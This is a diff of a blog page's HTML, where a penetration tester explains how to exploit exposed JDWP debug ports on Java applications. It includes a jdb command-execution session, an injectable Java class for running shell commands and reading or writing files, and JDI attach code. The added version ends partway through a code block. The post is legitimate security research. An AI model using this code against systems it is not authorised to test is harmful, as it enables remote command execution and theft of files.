@@ -1,515 +1,408 @@
-<!DOCTYPE html>
-<html lang="en-us">
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>A Complete Noobs Exploration of JDWP and JDI — ~/wired/</title>
-  <link rel="stylesheet" href="/css/styles.css">
-</head>
-
-<body>
-  <canvas id="spacefield" aria-hidden="true"></canvas>
-<script src="/js/spacefield.js" defer></script>
-
-  <div class="wrap">
-    <header class="site">
-  <div class="prompt">mike@malicious.dev:~$</div>
-  <h1>~/wired/ <span class="cursor" aria-hidden="true"></span></h1>
-  <p class="post-meta">Random Technical Posts and Curios</p>
-</header>
-
-    <main role="main">
-      
-  <article class="post-single">
-    <header>
-      <h2 class="post-title">A Complete Noobs Exploration of JDWP and JDI</h2>
-      <div class="post-meta">2025-08-18 · 11 min read</div>
-    </header>
-    <div class="content">
-      <h2 id="intro">Intro</h2>
-<p>Recently on a penetration test my team and I discovered several JDWP ports open. The Java Debug Wire Protocol (JDWP) is <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/jdwp-spec.html">&quot;[&hellip;] used for communication between a debugger and the Java virtual machine (VM) which it debugs.&quot;</a></p>
-<p>So tl;dr: You can connect to a remote or local JVM over various protocols, break/suspend threads, and run code in the context of the suspended thread(s).</p>
-<p>Public tooling for JDWP exploitation:</p>
-<ul>
-<li>IOActive&rsquo;s <a href="https://github.com/IOActive/jdwp-shellifier">jdwp-shellifier</a></li>
-<li>Metasploit&rsquo;s <a href="https://github.com/rapid7/metasploit-framework/blob/7f833ceba5d6ad01272fbf6169fb24dcf0173c68/modules/exploits/multi/misc/java_jdwp_debugger.rb">java_jdwp_debugger.rb</a></li>
-</ul>
-<h2 id="problem">Problem</h2>
-<p>Our exploitation of JDWP was <em><strong>severely limited</strong></em> due to traffic restrictions preventing us from uploading and executing our C2 tooling, with our only options being a DNS C2 channel or executing commands directly via JDWP.</p>
-<p>As such, we were unable to get any callbacks to our testing host from the Metasploit module and since the IOActive script only blindly executes commands we were unable to perform any meaningful post-exploitation. While we did inevitably deploy our custom C2 agent successfully using DNS as a C2 channel, I wanted to spend more time understanding JDWP, the Java Debug Interface (JDI), and what I could do with pure Java.</p>
-<p>Why not use Metasploit or IOActive&rsquo;s script?
-There&rsquo;s nothing <em><strong>wrong</strong></em> with those scripts at all, though I wanted to see what I could do to limit the amount of JDI calls to the remote VM and how much I could implement in pure Java that would not require dropping a payload to disk.</p>
-<h2 id="testing">Testing</h2>
-<p>To accomplish my goal I knew that I needed to:</p>
-<ol>
-<li>Attach to a remote VM</li>
-<li>Break on a commonly hit method</li>
-<li>Wait for a thread to hit the breakpoint</li>
-<li>Resume other threads and execute code in the suspended thread</li>
-</ol>
-<p>My first step was to download and run a simple Java program I could use to test <code>jdb</code> and eventually iron out the steps I need to take to build a simple shell using the JDI.</p>
-<p>I used the following simple &ldquo;Hello World&rdquo; HTTP Server as the target debugee application:</p>
-<ul>
-<li><a href="https://github.com/OpenShift-Z/hello-world-http-java">https://github.com/OpenShift-Z/hello-world-http-java</a></li>
-</ul>
-<p>The following code snippet shows the <code>main</code> function as well as the test request handler:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.OutputStream;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.InetSocketAddress;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.net.httpserver.HttpExchange;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.net.httpserver.HttpHandler;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.net.httpserver.HttpServer;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">HelloWorld</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> port <span style="color:#f92672">=</span> 8000;
-</span></span><span style="display:flex;"><span>        HttpServer server <span style="color:#f92672">=</span> HttpServer.<span style="color:#a6e22e">create</span>(<span style="color:#66d9ef">new</span> InetSocketAddress(port), 0);
-</span></span><span style="display:flex;"><span>        server.<span style="color:#a6e22e">createContext</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#66d9ef">new</span> MyHandler());
-</span></span><span style="display:flex;"><span>        server.<span style="color:#a6e22e">setExecutor</span>(<span style="color:#66d9ef">null</span>); <span style="color:#75715e">// creates a default executor</span>
-</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Serving on port 8000..\n&#34;</span>);
-</span></span><span style="display:flex;"><span>        server.<span style="color:#a6e22e">start</span>();
-</span></span><span style="display:flex;"><span>    } 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyHandler</span> <span style="color:#66d9ef">implements</span> HttpHandler {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@Override</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">handle</span>(HttpExchange t) <span style="color:#66d9ef">throws</span> IOException {
-</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Logging IP address of request to stdout</span>
-</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Request received from: &#34;</span> <span style="color:#f92672">+</span> t.<span style="color:#a6e22e">getRemoteAddress</span>().<span style="color:#a6e22e">toString</span>());
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Displaying Hello message</span>
-</span></span><span style="display:flex;"><span>            String hello <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Hello CBSA!!!!!!&#34;</span>;
-</span></span><span style="display:flex;"><span>            String response <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;html&gt;&lt;body&gt;&lt;h1&gt;&#34;</span> <span style="color:#f92672">+</span> hello <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/h1&gt;\n&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Displaying the OS arch that this is running on</span>
-</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&lt;h2&gt;JVM Architecture: &#34;</span> <span style="color:#f92672">+</span> System.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;os.arch&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/h2&gt;\n&#34;</span>;
-</span></span><span style="display:flex;"><span>            
-</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&lt;h2&gt;JVM Flavor: &#34;</span> <span style="color:#f92672">+</span> System.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;java.vm.name&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#34;</span>  <span style="color:#f92672">+</span> System.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;java.version&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/h2&gt;\n&#34;</span>;
-</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;\n&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Sending response</span>
-</span></span><span style="display:flex;"><span>            t.<span style="color:#a6e22e">sendResponseHeaders</span>(200, response.<span style="color:#a6e22e">length</span>());
-</span></span><span style="display:flex;"><span>            OutputStream os <span style="color:#f92672">=</span> t.<span style="color:#a6e22e">getResponseBody</span>();
-</span></span><span style="display:flex;"><span>            os.<span style="color:#a6e22e">write</span>(response.<span style="color:#a6e22e">getBytes</span>());
-</span></span><span style="display:flex;"><span>            os.<span style="color:#a6e22e">close</span>();
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>After compiling the application, I executed the JAR with debug options enabled:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mike@host:~/jdwp_stuff/hello-world-http-java$ java -agentlib:jdwp<span style="color:#f92672">=</span>transport<span style="color:#f92672">=</span>dt_socket,server<span style="color:#f92672">=</span>y,suspend<span style="color:#f92672">=</span>n,address<span style="color:#f92672">=</span><span style="color:#ae81ff">1234</span> -jar ./src/HelloWorld.jar 
-</span></span><span style="display:flex;"><span>Listening <span style="color:#66d9ef">for</span> transport dt_socket at address: <span style="color:#ae81ff">1234</span>
-</span></span><span style="display:flex;"><span>Serving on port 8000..
-</span></span></code></pre></div><p>Once run, I used the Java Debugger <code>jdb</code> to attach to the remote VM and list the loaded classes to look for a breakpoint:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mike@host:~$ jdb -attach 127.0.0.1:1234
-</span></span><span style="display:flex;"><span>Set uncaught java.lang.Throwable
-</span></span><span style="display:flex;"><span>Set deferred uncaught java.lang.Throwable
-</span></span><span style="display:flex;"><span>Initializing jdb ...
-</span></span><span style="display:flex;"><span>&gt; classes
-</span></span><span style="display:flex;"><span>** classes list **
-</span></span><span style="display:flex;"><span>HelloWorld
-</span></span><span style="display:flex;"><span>HelloWorld$MyHandler
-</span></span><span style="display:flex;"><span>boolean<span style="color:#f92672">[]</span>
-</span></span><span style="display:flex;"><span>byte<span style="color:#f92672">[]</span>
-</span></span><span style="display:flex;"><span>char<span style="color:#f92672">[]</span>
-</span></span><span style="display:flex;"><span>com.sun.net.httpserver.Filter
-</span></span><span style="display:flex;"><span>com.sun.net.httpserver.HttpContext
-</span></span><span style="display:flex;"><span>com.sun.net.httpserver.HttpHandler
-</span></span><span style="display:flex;"><span>com.sun.net.httpserver.HttpServer
-</span></span><span style="display:flex;"><span>com.sun.net.httpserver.spi.HttpServerProvider
-</span></span><span style="display:flex;"><span>com.sun.net.httpserver.spi.HttpServerProvider$1
-</span></span><span style="display:flex;"><span>... snip ...
-</span></span><span style="display:flex;"><span>&gt; methods HelloWorld$MyHandler
-</span></span><span style="display:flex;"><span>** methods list **
-</span></span><span style="display:flex;"><span>HelloWorld$MyHandler &lt;init&gt;<span style="color:#f92672">()</span>
-</span></span><span style="display:flex;"><span>HelloWorld$MyHandler handle<span style="color:#f92672">(</span>com.sun.net.httpserver.HttpExchange<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>java.lang.Object registerNatives<span style="color:#f92672">()</span>
-</span></span><span style="display:flex;"><span>java.lang.Object &lt;init&gt;<span style="color:#f92672">()</span>
-</span></span><span style="display:flex;"><span>java.lang.Object getClass<span style="color:#f92672">()</span>
-</span></span><span style="display:flex;"><span>java.lang.Object hashCode<span style="color:#f92672">()</span>
-</span></span><span style="display:flex;"><span>java.lang.Object equals<span style="color:#f92672">(</span>java.lang.Object<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>java.lang.Object clone<span style="color:#f92672">()</span>
-</span></span><span style="display:flex;"><span>java.lang.Object toString<span style="color:#f92672">()</span>
-</span></span><span style="display:flex;"><span>java.lang.Object notify<span style="color:#f92672">()</span>
-</span></span><span style="display:flex;"><span>java.lang.Object notifyAll<span style="color:#f92672">()</span>
-</span></span><span style="display:flex;"><span>java.lang.Object wait<span style="color:#f92672">()</span>
-</span></span><span style="display:flex;"><span>java.lang.Object wait<span style="color:#f92672">(</span>long<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>java.lang.Object wait<span style="color:#f92672">(</span>long, int<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>java.lang.Object finalize<span style="color:#f92672">()</span>
-</span></span><span style="display:flex;"><span>java.lang.Object &lt;clinit&gt;<span style="color:#f92672">()</span>
-</span></span><span style="display:flex;"><span>com.sun.net.httpserver.HttpHandler handle<span style="color:#f92672">(</span>com.sun.net.httpserver.HttpExchange<span style="color:#f92672">)</span>
-</span></span></code></pre></div><p>I placed a breakpoint on the <code>handle</code> method and used cURL to trigger the HTTP handler. Once the breakpoint was hit, I issued the following command to use Java&rsquo;s <code>java.lang.Runtime</code> <code>exec()</code> method to execute a local command:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>&gt; stop in HelloWorld$MyHandler.handle
-</span></span><span style="display:flex;"><span>Set breakpoint HelloWorld$MyHandler.handle
-</span></span><span style="display:flex;"><span>&gt; 
-</span></span><span style="display:flex;"><span>Breakpoint hit: <span style="color:#e6db74">&#34;thread=HTTP-Dispatcher&#34;</span>, HelloWorld$MyHandler.handle<span style="color:#f92672">()</span>, line<span style="color:#f92672">=</span><span style="color:#ae81ff">23</span> bci<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>HTTP-Dispatcher<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> print new java.lang.String<span style="color:#f92672">(</span>java.lang.Runtime.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;id&#34;</span><span style="color:#f92672">)</span>.getInputStream<span style="color:#f92672">()</span>.readAllBytes<span style="color:#f92672">())</span>
-</span></span><span style="display:flex;"><span> new java.lang.String<span style="color:#f92672">(</span>java.lang.Runtime.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;id&#34;</span><span style="color:#f92672">)</span>.getInputStream<span style="color:#f92672">()</span>.readAllBytes<span style="color:#f92672">())</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uid=1000(mike) gid=1000(mike) groups=1000(mike),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),984(docker)
-</span></span></span></code></pre></div><p>Now I have:</p>
-<ol>
-<li>A breakpoint I can reliably trigger with a curl request</li>
-<li>A <code>jdb</code> command I can use to execute commands on the host</li>
-</ol>
-<p>So I need to write code that will:</p>
-<ol>
-<li>Connect to the remote VM</li>
-<li>Break on the target method</li>
-<li>Wait for the breakpoint to be hit</li>
-<li>Execute code in the suspended thread</li>
-<li>Return the result</li>
-</ol>
-<h2 id="solution">Solution</h2>
-<p>It&rsquo;s important to note that all local data must be mirrored to the remote VM, and all remote data you want to retrieve should be mirrored into the local process when using JDI to invoke remote methods.</p>
-<p>My first and admittedly naive approach was to:</p>
-<ol>
-<li>Leverage JDI to connect to the remote VM</li>
-<li>Suspend all target threads (important mistake)</li>
-<li>Invoke <code>java.lang.Runtime.getRuntime().exec(String command)</code> with my target command</li>
-<li>Call the <code>Process.getInputStream().readAllBytes()</code> method</li>
-<li>Call the <code>String(byte[])</code> constructor</li>
-<li>Copy the resulting string from the target VM to my host and print the result</li>
-</ol>
-<p>This ended up being&hellip; way too many JDI calls which inevitably took forever (if they ever completed).</p>
-<p>I will spare you the details of my trial and error, but I found several key issues with this approach:</p>
-<ul>
-<li>Repeated calls over JDWP were unstable and took several seconds for each command</li>
-<li>Suspending all threads was a poor decision based on my lack of subject knowledge (read: skill issue), as this caused deadlock and ultimately disrupted the running application&rsquo;s availability</li>
-</ul>
-<p>I kept beating my head against this problem until I realized, why go through the hassle of writing 319287391287 manual invocations and string/byte copies to and from the remote VM when I could just load a class that performs the tasks I need and greatly reduce the remote invocations?</p>
-<p>I will use the following simple example class which supports command execution, file upload, and file download. Further works can absolutely expand on this &ndash; there&rsquo;s so much more possible.</p>
-<p>Do note that all of the methods are static, as I do not necessarily need to retain any stateful information and did not create an instance of the class in the remote VM.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Java" data-lang="Java"><span style="display:flex;"><span><span style="color:#f92672">package</span> org.example;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.File;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileInputStream;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileOutputStream;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.InputStream;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Vastatrix4</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">ExecuteCommand</span>(String command) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>{
-</span></span><span style="display:flex;"><span>            Process process <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ProcessBuilder(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, command)
-</span></span><span style="display:flex;"><span>                    .<span style="color:#a6e22e">redirectErrorStream</span>(<span style="color:#66d9ef">true</span>)
-</span></span><span style="display:flex;"><span>                    .<span style="color:#a6e22e">start</span>();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            InputStream stdout <span style="color:#f92672">=</span> process.<span style="color:#a6e22e">getInputStream</span>();
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> String(stdout.<span style="color:#a6e22e">readAllBytes</span>());
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> (Exception ex){
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> ex.<span style="color:#a6e22e">toString</span>();
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">ReadFile</span>(String filename){
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>{
-</span></span><span style="display:flex;"><span>            File file <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(filename);
-</span></span><span style="display:flex;"><span>            FileInputStream fis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileInputStream(file);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> data <span style="color:#f92672">=</span> fis.<span style="color:#a6e22e">readAllBytes</span>();
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> data;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> (Exception ex){
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> ex.<span style="color:#a6e22e">toString</span>().<span style="color:#a6e22e">getBytes</span>();
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">WriteFile</span>(String filename, <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> data){
-</span></span><span style="display:flex;"><span>        File file <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(filename);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> (FileOutputStream fos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileOutputStream(file)) {
-</span></span><span style="display:flex;"><span>            fos.<span style="color:#a6e22e">write</span>(data);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> filename;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> (Exception ex){
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> ex.<span style="color:#a6e22e">toString</span>();
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Compiling the class with <code>javac Vastatrix4.java</code> we are left with the compiled class file which we can then directly inject into the remote VM.</p>
-<p>Firstly we connect to the remote VM:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">Connect</span>(){
-</span></span><span style="display:flex;"><span>        List<span style="color:#f92672">&lt;</span>AttachingConnector<span style="color:#f92672">&gt;</span> connectors <span style="color:#f92672">=</span> Bootstrap.<span style="color:#a6e22e">virtualMachineManager</span>().<span style="color:#a6e22e">attachingConnectors</span>();
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (AttachingConnector connector : connectors) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (connector.<span style="color:#a6e22e">name</span>().<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;com.sun.jdi.SocketAttach&#34;</span>)) {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">attachingConnector</span> <span style="color:#f92672">=</span> connector;
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (attachingConnector <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;[-] No attaching connector found&#34;</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        Map<span style="color:#f92672">&lt;</span>String, Connector.<span style="color:#a6e22e">Argument</span><span style="color:#f92672">&gt;</span> arguments;
-</span></span><span style="display:flex;"><span>        arguments <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">attachingConnector</span>.<span style="color:#a6e22e">defaultArguments</span>();
-</span></span><span style="display:flex;"><span>        arguments.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;hostname&#34;</span>).<span style="color:#a6e22e">setValue</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">host</span>);
-</span></span><span style="display:flex;"><span>        arguments.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;port&#34;</span>).<span style="color:#a6e22e">setValue</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">port</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">vm</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">attachingConnector</span>.<span style="color:#a6e22e">attach</span>(arguments);
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (IOException <span style="color:#f92672">|</span> IllegalConnectorArgumentsException e) {
-</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;[-] Error attaching connector\n\t&#34;</span> <span style="color:#f92672">+</span> e.<span style="color:#a6e22e">getMessage</span>());
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;[+] Successfully connected to remote JDI&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span></code></pre></div><p>Once complete we can hunt for and break on a commonly used method. Some of the methods I&rsquo;ve used with great success are:</p>
-<pre tabindex="0"><code>java.lang.Thread.run 
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>A Complete Noobs Exploration of JDWP and JDI — ~/wired/</title><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href=/css/styles.css><script>document.documentElement.classList.add("js")</script></head><body><canvas id=spacefield aria-hidden=true></canvas>
+<script src=/js/spacefield.js defer></script><div class=wrap><header class=site><nav class=topnav><a class=homebtn href=/ title=Home>cd ~</a></nav><div class=prompt>mike@malicious.dev:~$</div><h1>~/wired/ <span class=cursor aria-hidden=true></span></h1><p class=post-meta>Random Technical Posts and Curios</p></header><main role=main><article class=term id=post-term><div class=term-bar><span class=term-title><b>mike@malicious.dev</b>: ~/posts/jdwp</span></div><div class=term-body><div id=post-boot class=boot aria-hidden=true></div><div id=post-content><header><h2 class=post-title>A Complete Noobs Exploration of JDWP and JDI</h2><div class=post-meta>2025-08-18 · 11 min read</div></header><div class=content><h2 id=intro>Intro</h2><p>Recently on a penetration test my team and I discovered several JDWP ports open. The Java Debug Wire Protocol (JDWP) is <a href=https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/jdwp-spec.html>"[&mldr;] used for communication between a debugger and the Java virtual machine (VM) which it debugs."</a></p><p>So tl;dr: You can connect to a remote or local JVM over various protocols, break/suspend threads, and run code in the context of the suspended thread(s).</p><p>Public tooling for JDWP exploitation:</p><ul><li>IOActive&rsquo;s <a href=https://github.com/IOActive/jdwp-shellifier>jdwp-shellifier</a></li><li>Metasploit&rsquo;s <a href=https://github.com/rapid7/metasploit-framework/blob/7f833ceba5d6ad01272fbf6169fb24dcf0173c68/modules/exploits/multi/misc/java_jdwp_debugger.rb>java_jdwp_debugger.rb</a></li></ul><h2 id=problem>Problem</h2><p>Our exploitation of JDWP was <em><strong>severely limited</strong></em> due to traffic restrictions preventing us from uploading and executing our C2 tooling, with our only options being a DNS C2 channel or executing commands directly via JDWP.</p><p>As such, we were unable to get any callbacks to our testing host from the Metasploit module and since the IOActive script only blindly executes commands we were unable to perform any meaningful post-exploitation. While we did inevitably deploy our custom C2 agent successfully using DNS as a C2 channel, I wanted to spend more time understanding JDWP, the Java Debug Interface (JDI), and what I could do with pure Java.</p><p>Why not use Metasploit or IOActive&rsquo;s script?
+There&rsquo;s nothing <em><strong>wrong</strong></em> with those scripts at all, though I wanted to see what I could do to limit the amount of JDI calls to the remote VM and how much I could implement in pure Java that would not require dropping a payload to disk.</p><h2 id=testing>Testing</h2><p>To accomplish my goal I knew that I needed to:</p><ol><li>Attach to a remote VM</li><li>Break on a commonly hit method</li><li>Wait for a thread to hit the breakpoint</li><li>Resume other threads and execute code in the suspended thread</li></ol><p>My first step was to download and run a simple Java program I could use to test <code>jdb</code> and eventually iron out the steps I need to take to build a simple shell using the JDI.</p><p>I used the following simple &ldquo;Hello World&rdquo; HTTP Server as the target debugee application:</p><ul><li><a href=https://github.com/OpenShift-Z/hello-world-http-java>https://github.com/OpenShift-Z/hello-world-http-java</a></li></ul><p>The following code snippet shows the <code>main</code> function as well as the test request handler:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.OutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.net.InetSocketAddress;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.net.httpserver.HttpExchange;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.net.httpserver.HttpHandler;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.net.httpserver.HttpServer;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>HelloWorld</span> {
